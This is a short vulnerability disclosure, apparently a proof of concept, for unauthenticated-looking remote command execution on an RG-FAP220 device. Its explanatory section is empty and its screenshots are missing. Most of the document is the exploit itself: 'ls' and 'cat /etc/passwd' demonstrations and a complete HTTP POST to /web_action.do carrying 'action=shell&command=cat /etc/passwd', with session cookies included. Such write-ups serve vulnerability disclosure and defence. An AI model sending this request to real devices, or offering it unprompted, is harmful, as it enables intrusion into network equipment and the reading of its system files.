# RG-FAP220 RCE

## Overview

![image-20231222163155940](D:\typora 图片\image-20231222163155940.png)

## Vulnerability details



## POC

ls

![image-20231222164924298](D:\typora 图片\image-20231222164924298.png)

cat /etc/passwd

![image-20231222163247926](D:\typora 图片\image-20231222163247926.png)

## EXP

```
POST /web_action.do HTTP/1.1
Host: 192.168.110.1
Content-Length: 38
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.110.1
Referer: http://192.168.110.1/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; mac=0074.9ce6.95c0; SID=D65FDBE5CA6D86B59F94D3BF3872D87
Connection: close

action=shell&command=cat /etc/passwd
```

